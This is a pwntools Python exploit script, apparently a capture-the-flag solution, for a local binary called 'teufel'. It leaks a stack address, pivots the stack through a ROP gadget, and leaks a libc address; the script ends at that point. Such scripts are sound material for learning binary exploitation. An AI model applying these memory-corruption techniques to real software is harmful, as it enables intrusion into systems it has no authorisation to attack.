#!/usr/bin/env python3

from pwn import  *

r=process("./teufel")

r.send(p64(9))
r.send(b"A"*9)

assert r.recvn(8) == b"A"*8

stack = u64(r.recvline()[:-1].ljust(8, b"\x00")) & ~0xfff
log.info("Stack is at {:#x}".format(stack))

mov_rsp=0x004004d4
rop1=flat(
    [b"A"*8, 
     stack-0x100,
     mov_rsp
    ], word_size=64
)

r.send(p64(len(rop1)) + rop1)
r.recvline()
r.send(p64(16))
r.send(b"A"*16)

pause()

assert r.recvn(16) == b"A"*16
libc=u64(r.recvline()[:-1].ljust(8, b"\x00"))

log.info("Libc is at {:#x}".format(libc))

